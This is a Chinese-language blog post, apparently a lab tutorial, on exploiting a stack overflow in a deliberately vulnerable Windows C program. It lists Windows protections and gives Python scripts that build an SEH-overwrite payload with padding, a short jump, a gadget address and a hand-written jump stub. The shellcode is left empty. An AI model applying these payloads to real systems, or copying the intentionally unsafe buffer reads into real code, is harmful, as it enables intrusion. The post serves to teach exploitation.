@@ -1,0 +1,120 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【Win Pwn】基础栈溢出利用</title><meta name="description" content="&lt;p&gt;[Win Pwn] 基础栈溢出利用&lt;/p&gt;
+&lt;p&gt;window下无保护的栈溢出加载shellcode&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【Win Pwn】基础栈溢出利用</h3><div class="article__date metadata"><div class="post-info">2023/07/08</div></div><div class="article__tags metadata">Tags:
+<a class="article__tags__link metadata" href="/tags/windows/">windows</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a></div><div class="article__body"><p>[Win Pwn] 基础栈溢出利用</p>
+<p>window下无保护的栈溢出加载shellcode</p>
+<span id="more"></span>
+<h1 id="程序"><a class="markdownIt-Anchor" href="#程序"></a> 程序</h1>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>	</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">	str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line">		<span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在windows下的防护等级有</p>
+<ul>
+<li><code>ASLR</code>
+<ul>
+<li><code>/DYNAMICBASE</code> 带有剥离的重定位条目边缘情况</li>
+<li><code>/HIGHENTROPYVA</code> for 64-bit systems</li>
+</ul>
+</li>
+<li><code>Code integrity/signing:</code>
+<ul>
+<li><code>/INTEGRITYCHECK</code></li>
+<li>使用有效（可信、活动）证书进行 Authenticode 签名（Linux 目前不支持）</li>
+</ul>
+</li>
+<li><code>DEP</code>
+<ul>
+<li>别称：<code>W^X</code>, <code>NX</code></li>
+</ul>
+</li>
+<li><code>Manifest isolation</code>
+<ul>
+<li><code>/ALLOWISOLATION</code></li>
+</ul>
+</li>
+<li><code>SEH</code>和<code>SafeEH</code>
+<ul>
+<li><code>SEH</code>=<code>Structured Exception Handling</code></li>
+</ul>
+</li>
+<li><code>Control Flow Guard</code>和<code>Return Flow Guard instrumentation</code></li>
+<li><code>Stack cookie</code>
+<ul>
+<li><code>/GS</code></li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>
+<p>ASLR：与Linux的PIE相同，指地址随机化，将在程序启动时将DLL随机的加载到内存中的未知，自Windows 10开始已经在系统中被配置为默认启动；</p>
+</li>
+<li>
+<p>High Entropy VA：高熵64位地址空间布局随机化，开启后标识此程序的随机化取值空间为64 bit，这会导致攻击者更难去推测随机化后的地址；</p>
+</li>
+<li>
+<p>Force Integrity：强制签名保护，开启后标识程序加载时需要验证其中的前命，如果签名不正确，程序将会被阻止运行；</p>
+</li>
+<li>
+<p>Isolation：隔离保护，开启后表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限；</p>
+</li>
+<li>
+<p>NX/DEP/PAE：NX保护指的是内存页不可运行。属于系统级的内存保护功能，能够将一页或多页标记为不可执行，从而防止从该内存区域运行代码，以帮助防止利用缓冲区溢出。防止代码在数据页面（例如堆、栈和内存池）中运行，在Windows中常称为DEP。</p>
+<p>PAE指物理地址拓展，PAE是一项处理器功能，使x86处理器可以在部分windows版本上访问4 GB以上的物理内存。在基于x86的系统上运行的某些32位版本的Windows Server可以使用PAE访问最多64 GB或128 GB的物理内存，具体取决于处理器的物理地址大小。使用PAE，操作系统将从两级线性地址转换为三级地址转换。两级线性地址转换将线性地址拆分为3个独立的字段索引到内存表中，三级地址转换将其拆分为4个独立的字段：一个2位字段，两个9位字段和一个12位字段。PAE模式下的页表条目(PTE)和页目录条目(PDE)的大小从32位增加到64位。附加位允许操作系统PTE或PDE引用4 GB以上的物理内存，同时PAE将允许在基于x86的系统上运行32位windows中启用DEP等功能。</p>
+</li>
+<li>
+<p><code>SEHOP</code>：即结构化异常处理保护(structured Exception Handling Overwrite Protection)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。</p>
+</li>
+<li>
+<p><code>CFG</code>：即控制流防护这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点，最终及时有效的进行异常处理，避免引发相关的安全问题。</p>
+</li>
+<li>
+<p>RFG：即返回地址防护，在每个函数头部将返回地址保存到 <code>fs:[rsp](thread control stack)</code>，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止攻击；</p>
+</li>
+<li>
+<p>SafeSEH：安全结构化异常处理(Safe Structured Exception Handlers)，白名单版的安全沙箱，定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行；</p>
+</li>
+<li>
+<p>GS：类似于Linux中的Canary保护，开启后，会在返回地址和BP之前压入一个额外的 <code>Security Cookie</code>，系统会比较栈中的这个值和原先存放在 <code>.data</code>中的值做一个比较，如果两者不吻合，则说明发生了栈溢出；</p>
+</li>
+<li>
+<p>Authenticode：签名保护；</p>
+</li>
+<li>
+<p>.NET：DLL混淆级保护</p>
+</li>
+</ol>
+<p>你可以查看文件头进行识别，也可以使用winchecksec进行识别</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/325814dc1fa1572df0f97d5b7bd3ddfa.png" alt="image-20230707130719644" /></p>
+<p>非常明显的漏洞点</p>
+<h1 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h1>
+<p>GCC编译<code>gcc .\main.c -o shellcode</code></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c55686928835d42421d7f6c0656f5cff.png" alt="image-20230707130122963" /></p>
+<p>先试一下跳转，加上覆盖ebp的空间大小是<code>0x1c</code></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/46eaa11d681dcd3c33a4b431e30b2c79.png" alt="image-20230707131904489" /></p>
+<h1 id="加载shellcode"><a class="markdownIt-Anchor" href="#加载shellcode"></a> 加载shellcode</h1>
+<p>现在想办法布置shellcode，由于没有后门函数所以需要利用SEH进行shellcode的布置。</p>
+<p><strong>栈中的 SEH Handle 存储的形式</strong></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/eb18a130a41aa85ce5a74b3ef1d61905.png" alt="img" /></p>
+<p>基本的布置方式如下，实战的可以参考<a target="_blank" rel="noopener" href="https://blog.joe1sn.top/2021/05/18/CVE-2019-9766/">CVE-2019-9766简单栈溢出</a></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8a8a4e2f63396305958ac9645adb7c9a.png" alt="img" /></p>
+<p>使用<strong>x32dbg</strong>调试得到SEH链，然后得出payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x11c</span> <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">nops = <span class="string">b&quot;\x90&quot;</span>*<span class="number">5</span>                <span class="comment">#nops</span></span><br><span class="line"></span><br><span class="line">payload = offset+NSEH+gadget+shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
+<p>使用了gadget，进行两次pop抬栈，这样就能滑行到shellcode</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/80de864faf1862d894461625d818fcb0.png" alt="image-20230708144240496" /></p>
+<p>gadget过后的跳转</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4bdef43635c0608fb2dd1dce892a899c.png" alt="image-20230708144321174" /></p>
+<p>但是shellcode长度有限制，所以很寄</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c2eae4db075ff3efe7d7addc866d586c.png" alt="img" /></p>
+<p>但是我们执行一小段shellcode，那么可以尝试自己写gadget，将shellcode写入在payload前段，然后利用SEH到自己写的gadget，最后跳转到shellcode，需要注意的是程序会把第五位归0，所以要注意。</p>
+<p>在使用<code>fscanf</code>函数读取字符串时，以下特殊字符可能会导致读取失败或产生意外的结果：</p>
+<ol>
+<li>空格 (<code>0x20</code>)</li>
+<li>制表符 (<code>0x09</code>)</li>
+<li>换行符 (<code>0x0A</code>)</li>
+<li>回车符 (<code>0x0D</code>)</li>
+</ol>
+<p>这块儿就只有自己根据实际情况改进shellcode了。</p>
+<p>那么我稍微改进一下源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>	</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">	str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line">		<span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于栈比较小，可以考虑自己写入gadget来帮助shellcode的跳转</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x11c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x14\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/84688c248714ebea01d6ca5d019c7bb4.gif" alt="img" /></p>
+</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/07/12/win-pwn-stack2/">prev_post</a><a class="pagination__link pagination__next" href="/2023/07/03/qq-evasion/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
